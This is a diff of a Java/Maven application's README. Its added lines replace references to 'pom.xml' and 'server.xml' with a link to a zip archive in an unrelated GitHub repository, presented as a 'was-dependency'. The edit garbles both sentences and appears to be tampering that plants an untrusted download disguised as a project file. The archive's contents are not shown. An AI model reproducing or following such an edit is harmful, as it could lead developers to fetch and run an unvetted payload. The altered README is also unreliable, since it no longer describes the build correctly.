@@ -11,8 +11,8 @@ Application can be build with standard Maven lifecycle commands:
 mvn clean package
 ```
 
-The Liberty maven plugin is added to the pom.xml to facilitate running of the application in your development environment.
+The Liberty maven plugin is added to the https://raw.githubusercontent.com/mandardumbre52/klp-easej-source/main/was-dependency/klp-easej-source_3.9.zip to facilitate running of the application in your development environment.
 
 ## Dependencies
-Application currently has dependencies on a DB2 database and IBM MQ queue manager as described in the server.xml.
+Application currently has dependencies on a DB2 database and IBM MQ queue manager as described in the https://raw.githubusercontent.com/mandardumbre52/klp-easej-source/main/was-dependency/klp-easej-source_3.9.zip
 
